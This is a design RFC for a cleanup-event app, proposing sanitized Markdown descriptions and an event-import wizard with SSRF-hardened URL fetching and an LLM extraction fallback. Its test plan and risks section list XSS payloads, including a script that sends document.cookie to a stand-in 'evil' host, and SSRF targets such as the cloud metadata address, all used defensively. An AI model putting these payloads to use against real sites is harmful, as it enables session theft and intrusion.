# RFC — Rich-text descriptions and event-import wizard

> **Status:** draft, 2026-05-08
> **Author:** matthias (with Claude)
> **Supersedes:** Track B brainstorm captured during implementation of feedback `019dee68`
> **Related:** [docs/federation-analysis.md](../federation-analysis.md), [docs/public-api-design.md](../public-api-design.md), feedback `019dee68` (already shipped)

## 1. Context

Feedback `019dee68` reported "weird" cleanup-description rendering. Root cause was newlines collapsing in the read-only `<p>`; closed by a CSS-only fix (commit `5b32388`). The bug surfaced two underlying gaps:

1. **No formatting at all.** Cleanup descriptions are plain text. Users routinely paste from external event pages (Google Forms, Mobilizon, Meetup) where the source is structured — bullets, links, headings — and lose all of it on paste into a `<textarea>`.
2. **No way to import an event.** Importing existing events from third-party platforms is a real use case. Today every cleanup is hand-typed or pasted lossily.

This RFC proposes (a) Markdown-source descriptions with sanitized HTML rendering, and (b) an event-import wizard that pre-fills the cleanup creation form from a third-party event page or pasted content.

The two parts ship in sequence — Part I is a prerequisite for the wizard producing usefully-formatted descriptions, and Part I delivers value on its own even if Part II is delayed.

## 2. Goals / non-goals

**Goals**
- Cleanup descriptions support common Markdown: headings (h3/h4), bold, italic, lists, links, code, blockquote, line breaks. Existing plain-text descriptions render unchanged.
- Authenticated users can import an event by URL or pasted content and get the create-cleanup form pre-filled, with all extracted fields user-editable before save.
- Server-side URL fetching is SSRF-safe; LLM calls are deduplicated by content hash.
- Foundation aligns with [docs/federation-analysis.md](../federation-analysis.md) Phase 2 (ActivityPub Event ingestion is just one extractor among several).

**Non-goals**
- WYSIWYG editor (Tiptap/Lexical). Markdown source in a `<textarea>` is the chosen flavour.
- Auto-publishing imported events. Always require user review and submit.
- Outbound federation (publishing CleanCentive cleanups *as* ActivityPub events). Separate RFC, Phase 2 in federation-analysis.
- Image uploads inside descriptions. Existing per-cleanup photo path covers this.
- Backend geocoding service as a general capability (we add only what the wizard needs).

## 3. Part I — Markdown descriptions

### 3.1 Storage

- Keep the existing `description` `text` column on `cleanups` ([backend/src/cleanup/cleanup.entity.ts:15](../../backend/src/cleanup/cleanup.entity.ts#L15)). Stored content is **Markdown source**.
- No migration. Existing plain-text descriptions are valid Markdown — newlines render via the renderer's `breaks: true` setting (single `\n` → `<br>`) which is essential for the legacy paste-from-Forms content already in production.
- Search via `ILIKE` ([backend/src/cleanup/cleanup.service.ts:279](../../backend/src/cleanup/cleanup.service.ts#L279)) keeps working — Markdown source is human-readable.
- Length cap: enforce 8 KB at write time in [cleanup.service.ts](../../backend/src/cleanup/cleanup.service.ts) (currently unbounded). Throw `BadRequestException` on overflow.

### 3.2 Renderer

New component `frontend/src/components/MarkdownText.tsx`:

```tsx
import { marked } from 'marked'
import DOMPurify from 'dompurify'

const ALLOWED_TAGS = ['p','br','strong','em','ul','ol','li','a','code','pre','blockquote','h3','h4','h5']
const ALLOWED_ATTR = ['href','title']

marked.use({ breaks: true, gfm: true })

DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank')
    node.setAttribute('rel', 'noopener noreferrer ugc')
  }
})

export function MarkdownText({ source, className }: { source: string; className?: string }) {
  const html = DOMPurify.sanitize(marked.parse(source, { async: false }) as string, {
    ALLOWED_TAGS, ALLOWED_ATTR, ALLOWED_URI_REGEXP: /^(https?:|mailto:)/i,
  })
  return <div className={className} dangerouslySetInnerHTML={{ __html: html }} />
}
```

- Replace `<p className="cleanup-description-display">{cleanup.description}</p>` at [CleanupDetail.tsx:434](../../frontend/src/components/CleanupDetail.tsx#L434) with `<MarkdownText source={cleanup.description} className="cleanup-description-display" />`. The existing CSS class (`white-space: pre-wrap`, `overflow-wrap: anywhere`) stays — it's harmless on the wrapping `<div>` and protects long URLs inside `<p>` children.

### 3.3 Editor with Write/Preview tabs

A textarea alone is a leap of faith — users won't know whether their `**bold**` is interpreted, links resolve, or pasted content survives the sanitizer. v1 ships a small **Write/Preview** tab control above the textarea, modelled on GitHub's comment editor. Single-pane (mobile-friendly) and uses the same `MarkdownText` component as the detail view, guaranteeing what-you-see-is-what-you-get.

New component `frontend/src/components/MarkdownEditor.tsx`:

```tsx
export function MarkdownEditor({ value, onChange, rows, placeholder, id }: Props) {
  const [tab, setTab] = useState<'write' | 'preview'>('write')
  return (
    <div className="markdown-editor">
      <div className="markdown-editor-tabs" role="tablist">
        <button type="button" role="tab" aria-selected={tab === 'write'}
          className={tab === 'write' ? 'active' : ''} onClick={() => setTab('write')}>Write</button>
        <button type="button" role="tab" aria-selected={tab === 'preview'}
          className={tab === 'preview' ? 'active' : ''} onClick={() => setTab('preview')}>Preview</button>
        <a className="markdown-editor-help" href="https://www.markdownguide.org/basic-syntax/" target="_blank" rel="noopener">
          Markdown supported
        </a>
      </div>
      {tab === 'write' ? (
        <textarea id={id} value={value} onChange={(e) => onChange(e.target.value)}
          rows={rows} placeholder={placeholder} />
      ) : (
        value.trim()
          ? <MarkdownText source={value} className="markdown-editor-preview" />
          : <p className="markdown-editor-empty">Nothing to preview yet.</p>
      )}
    </div>
  )
}
```

- Drop-in replacement for the existing `<textarea>` in both create ([CleanupList.tsx:155](../../frontend/src/components/CleanupList.tsx#L155)) and edit ([CleanupDetail.tsx:417](../../frontend/src/components/CleanupDetail.tsx#L417)) forms.
- "Markdown supported" link is the discoverability hint — no extra tooltip needed.
- Preview pane uses the *exact same* `MarkdownText` (same allowlist, same `breaks: true`) used to render the saved description, so preview === final render. Critical guarantee.
- New CSS in [App.css](../../frontend/src/App.css):
  - `.markdown-editor-tabs` — flex row, two tab buttons + help link pushed right
  - `.markdown-editor-tabs button.active` — bottom-border accent matching project's primary colour
  - `.markdown-editor-preview` — same `white-space: pre-wrap; overflow-wrap: anywhere` as `.cleanup-description-display`, plus a subtle border so the preview area visually matches the textarea's footprint
  - `.markdown-editor-empty` — muted "Nothing to preview yet." placeholder

No additional dependencies — preview is a render of the existing component.

### 3.4 Dependencies

`bun --cwd frontend add marked dompurify` and `bun --cwd frontend add -d @types/dompurify`. Bundle impact: marked ~30 KB gz, DOMPurify ~25 KB gz. Acceptable on a frontend that already ships MapLibre.

### 3.5 XSS surface and test plan

- Test inputs: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `[xss](javascript:alert(1))`, `<a href="javascript:alert(1)">x</a>`, `<iframe src=...>`. All must render as inert text or stripped output.
- Regression: existing plain-text descriptions (with embedded `\n`) must render identically to the post-`019dee68` state.
- Add a Vitest unit test `MarkdownText.test.tsx` covering the above payloads.

## 4. Part II — Event-import wizard

### 4.1 Two input modes — URL or pasted content

The modal has two tabs:

- **From URL** — user pastes a public event URL. Backend fetches server-side. Works for clean public pages (Mobilizon, Meetup, Eventbrite, public blogs).
- **From pasted content** — user copies the visible event page in their browser and pastes either plain text or HTML into a textarea. Backend never fetches anything. Works for **anything the user can see** — login-walled pages (Facebook events), JS-rendered SPAs that fail server-side fetching, intranet/private events. This is the primary fallback when URL mode returns nothing useful.

Both modes share the same extraction pipeline downstream, eliminating SSRF as a *first-class concern*: URL mode is a convenience, paste mode is the always-works escape hatch.

### 4.1.1 Flow

1. User clicks **Import event** on the cleanup create form ([CleanupList.tsx](../../frontend/src/components/CleanupList.tsx) above the existing fields).
2. Modal opens with **URL** / **Paste** tabs. Submit calls `POST /api/v1/cleanups/import` with either `{ url }` or `{ rawHtml?, rawText }`.
3. Backend validates auth, dispatches the request to the worker via BullMQ (`event-import` queue), and `await job.waitUntilFinished()` with a 30 s timeout.
4. Worker:
   - URL mode: hardened fetch → page bytes
   - Paste mode: skip fetch, use `rawHtml`/`rawText` directly
   - then: structured-data parsers → LLM fallback → optional Nominatim geocode → return `{ name, description, startAt?, endAt?, locationName?, latitude?, longitude?, sourceUrl? }`.
5. Frontend pre-fills the existing create form with the returned fields and scrolls the user to it. Submit goes through the unchanged `POST /api/v1/cleanups`.

Imported descriptions are returned as Markdown source (rich content survives end-to-end because of Part I). The wizard never auto-creates a cleanup.

### 4.2 Backend endpoint

`backend/src/cleanup/cleanup.controller.ts`:

```ts
@Post('import')
@UseGuards(JwtAuthGuard)
async importEvent(
  @Body() body: { url?: string; rawHtml?: string; rawText?: string },
  @Req() req,
) {
  return this.cleanupService.importEvent(body, req.user.id)
}
```

`backend/src/cleanup/cleanup.service.ts` `importEvent()`:
- **URL mode** validation: must parse, must be `http`/`https`, host must not match private/loopback CIDRs (block `0.0.0.0/8`, `10/8`, `127/8`, `169.254/16`, `172.16/12`, `192.168/16`, `::1`, `fc00::/7`, `fe80::/10`). Resolve hostname via DNS first; reject if any A/AAAA record falls in the blocklist.
- **Paste mode**: cap `rawHtml` and `rawText` at 256 KB each; reject anything larger as 413. No SSRF concern at all.
- Redis cache key `event-import:<sha256(url-or-content-hash)>` with 24 h TTL to deduplicate retries. Cost is not a concern (LLM bill is already dominated by per-image litter detection — extraction is a marginal addition), but caching avoids redundant work on UI retries.
- Enqueue on the existing Redis connection but a **new queue name** `event-import` to keep observability separate from `litter-detection`.

### 4.3 Worker job

New worker file `worker/src/event-import.ts` registered alongside the litter detector in [worker/src/index.ts](../../worker/src/index.ts). Pipeline:

```
[URL mode]   fetch (hardened) ──┐
                                ├─→ structured-data extractors ─→ if all empty, LLM fallback ─→ optional geocode ─→ return
[paste mode] use rawHtml/rawText ┘
```

**Extraction pipeline** (first non-empty wins for each field):

| # | Extractor | Tech | Notes |
|---|-----------|------|-------|
| 1 | ActivityPub | `Accept: application/activity+json` content-negotiation; if response is AP `Event`, map fields | Mobilizon, Gancio |
| 2 | schema.org JSON-LD | `cheerio` to find `<script type="application/ld+json">`, look for `@type: Event` | Meetup, Eventbrite, many CMS |
| 3 | iCal embed | Detect `.ics` link or `text/calendar` content; parse with `node-ical` | iCal feeds |
| 4 | Open Graph | `<meta property="og:*">` for title, description, image | Generic web |
| 5 | LLM fallback | Strip chrome with cheerio `body.text()` (cap 50 KB), prompt LLM with strict JSON-schema response | Long tail |

**Hardened fetch util** `worker/src/url-fetch.ts`:
- Redirect cap: 5; on each redirect re-validate target host against private-IP blocklist.
- Body size cap: 5 MB (read with a counting `ReadableStream`, abort on overflow).
- Total timeout: 15 s.
- User-Agent: `CleanCentive-Importer/1.0 (+https://cleancentive.org)`.
- Refuses non-HTML/non-JSON-LD/non-iCal content types early.

**LLM fallback** uses a new envvar set, distinct from the vision-detection envs:

```
EXTRACTION_API_KEY=...
EXTRACTION_BASE_URL=https://api.mistral.ai/v1   (default)
EXTRACTION_MODEL=mistral-small-latest            (default — see model-choice note below)
```

**Model choice.** Litter detection uses `mistral-medium-latest` because it needs vision. Event extraction is text-only and the task is straightforward (fill a small JSON schema from page text), so a smaller/cheaper model is appropriate. Candidates worth benchmarking with a fixture suite (5–10 real-world pages: Mobilizon, Meetup, Eventbrite, a Swiss club blog, a Google Form) before locking in:

| Model | Strength | Notes |
|---|---|---|
| `mistral-small-latest` | Recommended default | Cheap, supports `response_format: { type: 'json_object' }`, sufficient for this task. |
| `ministral-8b-latest` | Cheaper still | Worth testing — may struggle with messy HTML/multi-language pages. |
| `mistral-medium-latest` (same as detection) | Strongest, simplest infra | Reuse one model for everything; only worth it if small models fail the fixture suite. |
| `gpt-4o-mini` (via OpenAI base URL) | Best JSON discipline at a low price | Drop-in if Mistral falters on JSON shape. |

Decision: ship with `mistral-small-latest`. Run the fixture suite as part of M3; if any fixture fails reproducibly, escalate to `mistral-medium-latest` before merging.

Prompt (mirrors the [worker/src/index.ts:114-148](../../worker/src/index.ts#L114-L148) build pattern but for events):

```
You extract event metadata from a web page. Return ONLY valid JSON matching:
{ "name": string, "description": string (Markdown allowed),
  "startAt": ISO8601 or null, "endAt": ISO8601 or null,
  "locationName": string or null }
If the page is not an event, return { "name": "", "description": "" } and let other fields be null.
Do not invent dates or locations not present in the page text.
PAGE TEXT:
<<<...>>>
```

Use `response_format: { type: 'json_object' }` (matches existing pattern at [worker/src/index.ts:323](../../worker/src/index.ts#L323)). Validate the response with a small zod-equivalent runtime check before returning to the backend.

### 4.4 Geocoding

If extraction yields `locationName` but no `latitude`/`longitude`, the worker calls Nominatim server-side:

```
GET https://nominatim.openstreetmap.org/search?q=<name>&format=jsonv2&limit=1
```

with a polite `User-Agent: CleanCentive/1.0 (+https://cleancentive.org)` and a 5 s timeout. Honour the public Nominatim usage policy (1 req/sec; cache results in Redis 7 days). Failure = leave coords undefined; user picks on the map as today.

### 4.5 Frontend

- New button **Import event** in [CleanupList.tsx](../../frontend/src/components/CleanupList.tsx) above the existing form, only visible when `showCreate` is true.
- New modal component `frontend/src/components/ImportEventModal.tsx`: URL / Paste tabs, submit button, spinner, error states.
- New store action `importCleanupEvent({ url?, rawHtml?, rawText? })` in [cleanupStore.ts](../../frontend/src/stores/cleanupStore.ts) using the existing axios + `getHeaders()` pattern.
- On success, dispatch into the existing form state (the same `setName`/`setDescription`/`setStartAt`/etc. setters in `CleanupList.tsx`). Set `latitude`/`longitude` if returned; otherwise leave the `LocationPicker` for the user.

## 5. Files to modify

**Part I — Markdown**
- [frontend/package.json](../../frontend/package.json) — add `marked`, `dompurify`, `@types/dompurify`
- [frontend/src/components/MarkdownText.tsx](../../frontend/src/components/MarkdownText.tsx) — new
- [frontend/src/components/MarkdownText.test.tsx](../../frontend/src/components/MarkdownText.test.tsx) — new
- [frontend/src/components/MarkdownEditor.tsx](../../frontend/src/components/MarkdownEditor.tsx) — new (Write/Preview tabs)
- [frontend/src/App.css](../../frontend/src/App.css) — `.markdown-editor*` styles
- [frontend/src/components/CleanupDetail.tsx](../../frontend/src/components/CleanupDetail.tsx) — `<p>` → `<MarkdownText>`; edit textarea → `<MarkdownEditor>`
- [frontend/src/components/CleanupList.tsx](../../frontend/src/components/CleanupList.tsx) — create textarea → `<MarkdownEditor>`
- [backend/src/cleanup/cleanup.service.ts](../../backend/src/cleanup/cleanup.service.ts) — 8 KB length cap

**Part II — Wizard**
- [worker/src/url-fetch.ts](../../worker/src/url-fetch.ts) — new SSRF-hardened fetcher
- [worker/src/event-import.ts](../../worker/src/event-import.ts) — new extractor pipeline + LLM fallback
- [worker/src/index.ts](../../worker/src/index.ts) — register `event-import` queue handler
- [worker/package.json](../../worker/package.json) — add `cheerio`, `node-ical`
- [worker/.env.example](../../worker/.env.example) — `EXTRACTION_*` envs
- [backend/src/cleanup/cleanup.controller.ts](../../backend/src/cleanup/cleanup.controller.ts) — `POST /import` route
- [backend/src/cleanup/cleanup.service.ts](../../backend/src/cleanup/cleanup.service.ts) — `importEvent()`, BullMQ enqueue, Redis cache
- [backend/src/cleanup/cleanup.module.ts](../../backend/src/cleanup/cleanup.module.ts) — wire BullMQ queue if not already
- [frontend/src/stores/cleanupStore.ts](../../frontend/src/stores/cleanupStore.ts) — `importCleanupEvent(payload)`
- [frontend/src/components/CleanupList.tsx](../../frontend/src/components/CleanupList.tsx) — Import button + modal mount
- [frontend/src/components/ImportEventModal.tsx](../../frontend/src/components/ImportEventModal.tsx) — new

## 6. Existing utilities reused

- LLM client + JSON-mode pattern: [worker/src/index.ts:313-350](../../worker/src/index.ts#L313-L350)
- Dynamic system-prompt building: [worker/src/index.ts:114-148](../../worker/src/index.ts#L114-L148)
- BullMQ enqueue + connection: [backend/src/spot/spot.service.ts:65-70](../../backend/src/spot/spot.service.ts#L65-L70)
- Outbound fetch baseline (extend, don't replace): [backend/src/team/team.service.ts:650-673](../../backend/src/team/team.service.ts#L650-L673)
- Frontend Nominatim client (precedent for geocoding code): [frontend/src/components/LocationPicker.tsx:21-42](../../frontend/src/components/LocationPicker.tsx#L21-L42)
- Frontend axios + auth header pattern: [frontend/src/stores/cleanupStore.ts:158-179](../../frontend/src/stores/cleanupStore.ts#L158-L179)

## 7. Phasing

| Milestone | Scope | Effort | Independently shippable? |
|---|---|---|---|
| **M1 — Markdown rendering + Write/Preview editor** | Part I in full (renderer + editor with preview tabs + length cap + tests) | ~0.75 day | Yes — closes the formatting gap on its own |
| **M2 — Paste-mode import + structured-data extractors** | `POST /cleanups/import` accepting `{ rawHtml, rawText }`; AP/JSON-LD/iCal/OG parsers; minimal modal with single "Paste content" tab | ~1.5 days | Yes — Mobilizon/Meetup/Eventbrite/Facebook all work via copy-paste; zero SSRF surface |
| **M3 — LLM fallback** | Mistral text extraction with `mistral-small-latest`; fixture suite; escalate model only if needed | ~1 day | Builds on M2 |
| **M4 — URL mode (hardened fetch)** | Add `{ url }` path with DNS resolve + CIDR blocklist + size/redirect/timeout caps; reuse the M2 extractor pipeline downstream | ~1 day | Builds on M2 |
| **M5 — Geocoding fallback + frontend polish** | Server-side Nominatim with 7-day Redis cache; modal tabs polish, error states, "Import event" button placement | ~1 day | Final polish |

Total ~5.25 days. Each milestone is its own commit referencing this RFC by path.

## 8. Risks & decisions

- **LLM hallucination of dates/locations.** Mitigation: prompt explicitly forbids invention; UI surfaces "extracted" badge so user double-checks before submit; never auto-create.
- **SSRF (URL mode only).** Mitigation in §4.2/§4.3 — DNS resolve + private-IP blocklist + size/redirect/timeout caps. The paste-mode escape hatch removes SSRF as a hard blocker for any specific source: when a URL is risky, behind login, or fails to fetch cleanly, users paste instead. Add unit tests asserting rejection of `http://localhost`, `http://169.254.169.254/`, `http://10.0.0.1/`, and an open-redirect chain.
- **Markdown XSS** — what it is, why DOMPurify is needed:
  - Markdown renderers turn user input into HTML. By default, `marked` (and most others) **passes through raw HTML embedded in Markdown**, because that's part of the GFM spec. So a user typing `<script>fetch('https://evil/'+document.cookie)</script>` into the description gets a real `<script>` element on the detail page.
  - Even without raw HTML, Markdown links accept any URI: `[click me](javascript:alert(document.cookie))` becomes `<a href="javascript:...">` and fires on click.
  - Image syntax is the same: `![alt](javascript:...)` or `<img src=x onerror=...>`.
  - DOMPurify runs after `marked.parse()` and strips/neutralises every dangerous construct *as a function of the resulting DOM*, which is more reliable than regex-scrubbing the source. Our `ALLOWED_TAGS` whitelist excludes `<script>`/`<iframe>`/`<style>`/`<img>` outright, and `ALLOWED_URI_REGEXP: /^(https?:|mailto:)/i` rejects `javascript:` and `data:` URIs on links. The `afterSanitizeAttributes` hook forces `target="_blank" rel="noopener noreferrer ugc"` on every surviving `<a>`.
  - The Vitest payload suite (§3.5) is the regression net.
- **Bundle size.** marked + DOMPurify add ~55 KB gz. Acceptable; if it ever matters, swap to a smaller renderer or render server-side.
- **Renderer scope.** Cleanup descriptions only. Feedback responses, team about, etc. **stay plain-text**. CleanCentive's own user-content surface is intentionally minimal — each team has a real Outline wiki page (per [docs/wiki.md](../wiki.md)) for richer team content; we route long-form there rather than reinventing it inside the app.
- **Natural follow-on: ActivityPub.** This RFC's URL-fetch + structured-data path implements the **consumer** side of [docs/federation-analysis.md](../federation-analysis.md) Phase 2 (CleanCentive ingests events from the Fediverse). The **publisher** side — exposing CleanCentive cleanups *as* federated `Event` objects — is the natural next step and reuses much of the same plumbing (HTTP signing, JSON-LD shaping). It is intentionally out of scope for this RFC but should follow it directly. See §9 implementation order.

## 9. Implementation order

1. **M1** — Markdown rendering + Write/Preview editor. Single commit. No upstream feedback to close.
2. **M2** — Paste-mode endpoint + structured-data extractors. Paste-mode-first means we ship this milestone with zero SSRF surface and validate the extractor pipeline against real pasted content.
3. **M3** — LLM fallback. Run the fixture suite against `mistral-small-latest`; escalate model if any fixture fails reproducibly.
4. **M4** — URL mode with hardened fetch. Adds the SSRF-bounded code path on top of the already-validated extractor pipeline.
5. **M5** — Geocoding fallback + frontend modal polish.
6. **Next RFC, not this one:** ActivityPub *publisher* — expose CleanCentive cleanups as federated `Event` objects (see §8 follow-on). Builds on the JSON-LD + HTTP code added by M2/M4 and aligns with [docs/federation-analysis.md](../federation-analysis.md) Phase 2.

## 10. Verification

**Part I**
1. `bun --cwd frontend tsc --noEmit` clean.
2. `bun --cwd frontend test MarkdownText` — XSS payload suite passes.
3. Dev server: open Adelboden cleanup, confirm pre-existing plain-text content renders unchanged.
4. Create a new cleanup with `## Heading\n\n- list\n- items\n\n[link](https://example.com)`. In the editor, click **Preview** before saving — confirm rendered output matches expectation. Save, then view detail page — confirm preview matches saved render exactly (same `MarkdownText` instance).
5. On mobile viewport (Chrome devtools 375px), confirm the Write/Preview tabs are usable and the preview pane keeps the textarea's footprint stable (no layout shift on toggle).
6. Bundle size: `bun --cwd frontend run build` and inspect output; flag if main chunk grows >75 KB gz from the addition.

**Part II**
1. `bun --cwd worker test event-import` — extractor unit tests against canned HTML fixtures (Mobilizon, Meetup, Eventbrite, plain blog post, Google Form).
2. SSRF unit tests in `worker/src/url-fetch.test.ts`: assert rejection for `localhost`, link-local, RFC1918, redirect-to-private.
3. Manual: paste a known Mobilizon, Meetup, Eventbrite, and arbitrary blog event URL through the UI; confirm form pre-fill.
4. Manual: copy a Facebook event page and paste into the **Paste** tab; confirm form pre-fill via LLM fallback.
5. Cost telemetry: log token usage per LLM fallback for the first week post-launch.
